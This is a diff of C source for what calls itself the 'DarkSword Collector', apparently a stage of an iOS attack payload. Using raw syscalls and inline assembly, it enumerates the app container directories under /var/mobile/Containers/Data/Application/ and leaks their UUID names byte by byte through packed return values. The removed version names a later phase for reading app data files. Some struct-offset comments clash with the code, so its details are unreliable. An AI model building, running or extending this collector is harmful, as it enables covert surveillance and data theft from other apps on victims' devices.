@@ -1,7 +1,6 @@
 /**
- * DarkSword Collector v38 - Directory enumeration via getdirentries
- * Lists /var/mobile/Containers/Data/Application/ to find app container UUIDs
- * Returns first byte of each UUID directory name
+ * DarkSword Collector v39 - Directory enumeration (stack buffer)
+ * Uses stack buffer for getdirentries to avoid __TEXT write issues
  */
 
 static long _svc1(long n, long a) {
@@ -22,81 +21,74 @@ static long _svc4(long n, long a, long b, long c, long d) {
 }
 
 #define SYS_open 5
-#define SYS_read 3
 #define SYS_close 6
-#define SYS_lseek 199
 #define SYS_getdirentries 196
-#define SEEK_SET 0
 #define O_RDONLY 0
 
-/* Phase 1: Enumerate container dir entries
- * Phase 2: Read specific app data files
- * g_ctx: bits 0-15 = chunk/entry index, bits 16-23 = phase (0=enum, 1+=files)
- */
 static volatile int g_ctx = 0;
 
-/* Buffer for directory entries - in __TEXT,__const to avoid __DATA issues */
-static volatile unsigned char dirbuf[4096] __attribute__((section("__TEXT,__const"))) = {0};
+/* dirent layout on iOS: d_ino(8) + d_seekoff(8) + d_reclen(2) + d_namlen(2) + d_type(1) + d_name(...) = 21 bytes header */
 
 int ds_start(void) {
     int ctx;
     __asm__("ldr %w0, [%1]" : "=r"(ctx) : "r"(&g_ctx));
-    int phase = (ctx >> 16) & 0xFF;
-    int idx = ctx & 0xFFFF;
+    int cnt = ctx & 0xFFFF;
 
-    if (phase == 0) {
-        /* Phase 0: Enumerate app container directory */
-        if (idx >= 200) {
-            /* Move to phase 1 */
-            int nc = (1 << 16);
-            __asm__("str %w0, [%1]" : : "r"(nc), "r"(&g_ctx));
-            return 0xFF000000 | 0; /* phase boundary */
-        }
-
-        int fd = (int)_svc2(SYS_open, (long)"/var/mobile/Containers/Data/Application/", O_RDONLY);
-        if (fd < 0) return 0xFE000000;
-
-        long base = 0;
-        int nread = (int)_svc4(SYS_getdirentries, fd, (long)(dirbuf + 16), 4000, (long)&dirbuf);
-        _svc1(SYS_close, fd);
-
-        if (nread < 1) {
-            int nc = (1 << 16);
-            __asm__("str %w0, [%1]" : : "r"(nc), "r"(&g_ctx));
-            return 0xEE000000;
-        }
-
-        /* Walk entries and return count + first entry info */
-        int pos = 0;
-        int count = 0;
-        int first_namlen = 0;
-        unsigned char first_byte = 0;
-
-        while (pos < nread) {
-            unsigned short *entry = (unsigned short *)(dirbuf + 16 + pos);
-            unsigned short reclen = entry[4];  /* d_reclen at offset 8 */
-            unsigned short namlen = entry[5];  /* d_namlen at offset 10 */
-            unsigned char dtype = *((unsigned char *)(dirbuf + 16 + pos + 11)); /* d_type at offset 11 */
-
-            if (reclen == 0) break;
-            count++;
-
-            if (count == 1) {
-                first_namlen = namlen;
-                first_byte = *((unsigned char *)(dirbuf + 16 + pos + 12)); /* d_name[0] */
-            }
-
-            pos += reclen;
-        }
-
-        /* Return: count in bits 0-7, first_entry_namlen in bits 8-15, first_byte in bits 16-23 */
-        int nc = (ctx + 1); /* advance chunk */
-        __asm__("str %w0, [%1]" : : "r"(nc), "r"(&g_ctx));
-
-        return count | (first_namlen << 8) | ((int)first_byte << 16);
+    if (cnt >= 50) {
+        __asm__("str %w0, [%1]" : : "r"(0), "r"(&g_ctx));
+        return 0xFFFFFFFF;
     }
 
-    /* Phase 1+: done for now */
-    __asm__("str %w0, [%1]" : : "r"(0), "r"(&g_ctx));
-    return 0xFFFFFFFF;
+    int fd = (int)_svc2(SYS_open, (long)"/var/mobile/Containers/Data/Application/", O_RDONLY);
+    if (fd < 0) return 0xFE000000;
+
+    /* Stack buffer - 2KB should hold many entries */
+    unsigned char buf[2048];
+    for (int i = 0; i < 2048; i++) buf[i] = 0;
+    long basep = 0;
+    int nread = (int)_svc4(SYS_getdirentries, fd, (long)buf, 2048, (long)&basep);
+    _svc1(SYS_close, fd);
+
+    if (nread < 1) {
+        __asm__("str %w0, [%1]" : : "r"(50), "r"(&g_ctx));
+        return 0xEE000000;
+    }
+
+    /* Count entries and get info about entry #cnt */
+    int pos = 0;
+    int entry_num = 0;
+    int total = 0;
+    int target_namlen = 0;
+    unsigned char target_first = 0;
+    unsigned char target_second = 0;
+
+    while (pos < nread && pos < 2048) {
+        /* d_reclen at offset 8 (uint16) */
+        unsigned short reclen = *(unsigned short *)(buf + pos + 8);
+        /* d_namlen at offset 10 (uint16) */
+        unsigned short namlen = *(unsigned short *)(buf + pos + 10);
+        /* d_type at offset 11 (uint8) */
+        unsigned char dtype = *(unsigned char *)(buf + pos + 11);
+        /* d_name starts at offset 12 */
+
+        if (reclen < 1 || reclen > 512) break;
+
+        /* Skip . and .. */
+        if (namlen > 2 || (namlen == 1 && buf[pos+12] != '.') || (namlen == 2 && (buf[pos+12] != '.' || buf[pos+13] != '.'))) {
+            total++;
+            if (total == cnt + 1) {
+                target_namlen = namlen;
+                target_first = buf[pos + 12];
+                if (namlen > 1) target_second = buf[pos + 13];
+            }
+        }
+
+        pos += reclen;
+    }
+
+    int nc = (cnt + 1);
+    __asm__("str %w0, [%1]" : : "r"(nc), "r"(&g_ctx));
+
+    /* Return: total entries in low 8 bits, target_namlen in bits 8-15, first byte in 16-23, second in 24-31 */
+    return (total & 0xFF) | ((target_namlen & 0xFF) << 8) | ((target_first & 0xFF) << 16) | ((target_second & 0xFF) << 24);
 }
